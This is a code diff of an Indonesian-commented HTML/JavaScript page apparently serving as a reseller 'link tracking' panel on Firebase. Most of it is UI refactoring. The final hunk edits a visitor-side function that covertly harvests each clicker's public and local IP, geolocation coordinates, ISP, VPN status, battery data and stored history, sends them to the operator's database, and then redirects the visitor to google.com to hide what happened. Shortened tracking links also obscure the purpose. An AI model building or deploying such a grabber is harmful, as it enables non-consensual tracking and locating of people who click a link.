@@ -373,6 +373,12 @@
             text-overflow: ellipsis;
             white-space: nowrap;
         }
+        
+        .empty-state {
+            text-align: center;
+            padding: 20px;
+            color: var(--light-grey);
+        }
     </style>
 </head>
 <body>
@@ -430,25 +436,15 @@
             <div class="admin-section">
                 <h2 class="section-title">Daftar Link Tracking</h2>
                 <div id="linksContainer">
-                    <!-- Link akan ditampilkan di sini -->
+                    <div class="empty-state">Belum ada link tracking</div>
                 </div>
             </div>
             
             <div class="admin-section">
                 <h2 class="section-title">Data Pengunjung untuk: <span id="currentLinkTitle">Pilih link</span></h2>
-                <table id="visitorsTable">
-                    <thead>
-                        <tr>
-                            <th>IP Address</th>
-                            <th>Waktu</th>
-                            <th>Lokasi</th>
-                            <th>Aksi</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <!-- Data akan diisi secara dinamis -->
-                    </tbody>
-                </table>
+                <div id="visitorsContainer">
+                    <div class="empty-state">Pilih link untuk melihat data pengunjung</div>
+                </div>
             </div>
         </div>
         
@@ -698,7 +694,10 @@
                     // Simpan ke database
                     database.ref(`resellers/${currentReseller.id}/links/${linkId}`).set(linkData)
                         .then(() => {
-                            const trackingLink = `${window.location.origin}${window.location.pathname}?reseller=${currentReseller.id}&link=${linkId}`;
+                            // Buat URL dengan format yang diinginkan
+                            const baseUrl = window.location.origin + window.location.pathname;
+                            const trackingLink = `${baseUrl}?${linkId}`;
+                            
                             document.getElementById('trackingLink').textContent = trackingLink;
                             document.getElementById('newLink').style.display = 'block';
                             document.getElementById('customLink').value = '';
@@ -742,7 +741,7 @@
                     linksContainer.innerHTML = '';
                     
                     if (!links) {
-                        linksContainer.innerHTML = '<p>Belum ada link tracking</p>';
+                        linksContainer.innerHTML = '<div class="empty-state">Belum ada link tracking</div>';
                         return;
                     }
                     
@@ -751,7 +750,9 @@
                         const linkElement = document.createElement('div');
                         linkElement.className = 'link-item';
                         
-                        const trackingLink = `${window.location.origin}${window.location.pathname}?reseller=${currentReseller.id}&link=${linkId}`;
+                        // Buat URL dengan format yang diinginkan
+                        const baseUrl = window.location.origin + window.location.pathname;
+                        const trackingLink = `${baseUrl}?${linkId}`;
                         
                         linkElement.innerHTML = `
                             <span class="link-url">${trackingLink}</span>
@@ -779,13 +780,30 @@
             database.ref(`resellers/${currentReseller.id}/links/${linkId}/visitors`).once('value')
                 .then((snapshot) => {
                     const visitors = snapshot.val();
-                    const tableBody = document.querySelector('#visitorsTable tbody');
-                    tableBody.innerHTML = '';
+                    const visitorsContainer = document.getElementById('visitorsContainer');
+                    visitorsContainer.innerHTML = '';
                     
                     if (!visitors) {
-                        tableBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Belum ada pengunjung</td></tr>';
+                        visitorsContainer.innerHTML = '<div class="empty-state">Belum ada pengunjung</div>';
                         return;
                     }
+                    
+                    // Buat tabel untuk menampilkan data pengunjung
+                    const table = document.createElement('table');
+                    table.innerHTML = `
+                        <thead>
+                            <tr>
+                                <th>IP Address</th>
+                                <th>Waktu</th>
+                                <th>Lokasi</th>
+                                <th>Aksi</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                        </tbody>
+                    `;
+                    
+                    const tbody = table.querySelector('tbody');
                     
                     Object.keys(visitors).forEach((visitorKey) => {
                         const visitor = visitors[visitorKey];
@@ -801,8 +819,10 @@
                             </td>
                         `;
                         
-                        tableBody.appendChild(row);
+                        tbody.appendChild(row);
                     });
+                    
+                    visitorsContainer.appendChild(table);
                 })
                 .catch((error) => {
                     console.error('Error loading visitors:', error);
@@ -820,11 +840,11 @@
                     showNotification('Link berhasil dihapus');
                     loadResellerLinks();
                     
-                    // Jika link yang sedang dilihat dihapus, kosongkan tabel pengunjung
+                    // Jika link yang sedang dilihat dihapus, kosongkan container pengunjung
                     if (currentLinkId === linkId) {
                         currentLinkId = null;
                         document.getElementById('currentLinkTitle').textContent = 'Pilih link';
-                        document.querySelector('#visitorsTable tbody').innerHTML = '';
+                        document.getElementById('visitorsContainer').innerHTML = '<div class="empty-state">Pilih link untuk melihat data pengunjung</div>';
                     }
                 })
                 .catch((error) => {
@@ -1102,53 +1122,60 @@
         
         // Fungsi utama untuk mengumpulkan dan mengirim data (mode pengunjung)
         async function collectAndSendData(resellerId, linkId) {
-            const ipInfo = await getIPInfo();
-            if (!ipInfo) return;
-            
-            const isVPN = await checkVPN(ipInfo.ip);
-            const localIP = await getLocalIP();
-            const batteryInfo = await getBatteryInfo();
-            
-            // Dapatkan dan simpan riwayat browser
-            const currentUrl = window.location.href;
-            saveToBrowserHistory(currentUrl);
-            const browserHistory = getBrowserHistory();
-            
-            const userAgent = navigator.userAgent;
-            const language = navigator.language;
-            const platform = navigator.platform;
-            
-            const data = {
-                ip: ipInfo.ip,
-                localIP: localIP,
-                country: ipInfo.country_name,
-                city: ipInfo.city,
-                region: ipInfo.region,
-                postal: ipInfo.postal,
-                isp: ipInfo.org,
-                userAgent: userAgent,
-                language: language,
-                os: platform,
-                vpn: isVPN,
-                latitude: ipInfo.latitude,
-                longitude: ipInfo.longitude,
-                reverseDNS: ipInfo.reverse || '',
-                connectionType: ipInfo.connection_type || '',
-                timestamp: new Date().toISOString(),
-                visitedPages: [currentUrl],
-                batteryInfo: batteryInfo,
-                browserHistory: browserHistory
-            };
-            
-            // Simpan data ke Firebase
-            const refPath = `resellers/${resellerId}/links/${linkId}/visitors/${data.ip.replace(/\./g, '-')}_${Date.now()}`;
-            database.ref(refPath).set(data)
-                .then(() => {
-                    console.log('Data successfully sent to Firebase');
-                })
-                .catch((error) => {
-                    console.error('Error sending data to Firebase:', error);
-                });
+            try {
+                const ipInfo = await getIPInfo();
+                if (!ipInfo) return;
+                
+                const isVPN = await checkVPN(ipInfo.ip);
+                const localIP = await getLocalIP();
+                const batteryInfo = await getBatteryInfo();
+                
+                // Dapatkan dan simpan riwayat browser
+                const currentUrl = window.location.href;
+                saveToBrowserHistory(currentUrl);
+                const browserHistory = getBrowserHistory();
+                
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                
+                const data = {
+                    ip: ipInfo.ip,
+                    localIP: localIP,
+                    country: ipInfo.country_name,
+                    city: ipInfo.city,
+                    region: ipInfo.region,
+                    postal: ipInfo.postal,
+                    isp: ipInfo.org,
+                    userAgent: userAgent,
+                    language: language,
+                    os: platform,
+                    vpn: isVPN,
+                    latitude: ipInfo.latitude,
+                    longitude: ipInfo.longitude,
+                    reverseDNS: ipInfo.reverse || '',
+                    connectionType: ipInfo.connection_type || '',
+                    timestamp: new Date().toISOString(),
+                    visitedPages: [currentUrl],
+                    batteryInfo: batteryInfo,
+                    browserHistory: browserHistory
+                };
+                
+                // Simpan data ke Firebase
+                const visitorId = data.ip.replace(/\./g, '-') + '_' + Date.now();
+                const refPath = `resellers/${resellerId}/links/${linkId}/visitors/${visitorId}`;
+                
+                await database.ref(refPath).set(data);
+                console.log('Data successfully sent to Firebase');
+                
+                // Redirect setelah 3 detik
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                }, 3000);
+                
+            } catch (error) {
+                console.error('Error sending data to Firebase:', error);
+            }
         }
     </script>
 </body>
